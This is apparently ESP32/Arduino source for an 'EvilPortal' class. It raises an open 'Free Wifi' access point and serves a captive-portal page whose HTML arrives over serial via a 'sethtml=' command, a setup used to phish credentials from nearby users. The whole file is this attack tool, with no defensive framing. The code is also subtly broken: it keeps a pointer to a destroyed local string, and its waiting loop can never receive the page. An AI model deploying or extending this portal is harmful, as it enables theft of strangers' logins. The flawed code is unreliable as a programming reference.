#include <WiFi.h>
#include <DNSServer.h>
#include <AsyncTCP.h>
#include <WiFiManager.h>

WiFiManager wifiManager;

class EvilPortal {
private:
  const char *ssid;
  const char *password;
  const char* HTML = "";

public:
  EvilPortal(const char *SSID = "Free Wifi") {
    ssid = SSID;
  };

  void begin() {

    while (String(HTML).length() == 0)
    {
      Serial.println("Waiting For HTML");
      delay(2000);
    }

    if (!wifiManager.startConfigPortal(ssid, NULL, HTML)) {
      Serial.println("failed to connect and hit timeout");
      delay(3000);
      return;
    }

    Serial.printf("Evil Portal Started at %s", WiFi.softAPIP().toString().c_str());
  }

  void loop() {
    if (Serial.available() && String(HTML).length() == 0) {
      String input = Serial.readStringUntil('\n');

      Serial.println(input.c_str());

      if (input.startsWith("sethtml=")) {
        input = input.substring(8);
        HTML = input.c_str();
        Serial.println("Got HTML");
      }
    }
  }
};